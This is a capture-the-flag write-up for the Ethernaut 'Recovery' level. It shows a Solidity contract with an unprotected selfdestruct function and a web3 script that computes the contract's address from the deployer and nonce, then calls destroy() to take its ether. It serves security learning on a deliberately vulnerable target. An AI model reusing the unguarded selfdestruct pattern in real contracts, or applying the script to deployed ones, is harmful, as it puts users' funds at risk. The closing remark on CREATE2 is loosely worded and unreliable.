# Ethernaut Challenge #17: Recovery

**Objective:** Recover the 0.001 ETH lost by the deployer.

**Contract Analysis:**
```solidity
contract Recovery {
  // SimpleToken lost 0.001 ether
}

contract SimpleToken {
  string public name;
  mapping (address => uint) public balances;

  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

**The Challenge:**

The `SimpleToken` contract was created by `Recovery`, but we don't know its address. We need to find it to call `destroy()` and recover the ETH.

**Contract Addresses Are Deterministic:**

Contract addresses are calculated as:
```
address = keccak256(rlp.encode([deployer_address, nonce]))[12:]
```

**Finding the Address:**

The Recovery contract deployed SimpleToken, so:
- Deployer = Recovery contract address
- Nonce = 1 (first contract deployment)

**The Attack (Off-Chain):**
```javascript
const Recovery = await web3.eth.getTransactionReceipt(recoveryTxHash);
const recoveryAddress = Recovery.contractAddress;

// Calculate SimpleToken address
const nonce = 1;
const rlpEncoded = rlp.encode([recoveryAddress, nonce]);
const contractAddress = '0x' + keccak256(rlpEncoded).slice(26);

// Now call destroy
const simpleToken = new web3.eth.Contract(abi, contractAddress);
await simpleToken.methods.destroy(playerAddress).send({from: playerAddress});
```

**Or via Etherscan:**
- Look at Recovery contract's internal transactions
- Find contract creation
- Copy address
- Call destroy

**The Lesson:**

Contract addresses are predictable. If you know the deployer and nonce, you can calculate any contract address.

This is how CREATE2 works, but with predictable addresses based on init code + salt.

**Status:** Challenge understood. Address derivation.
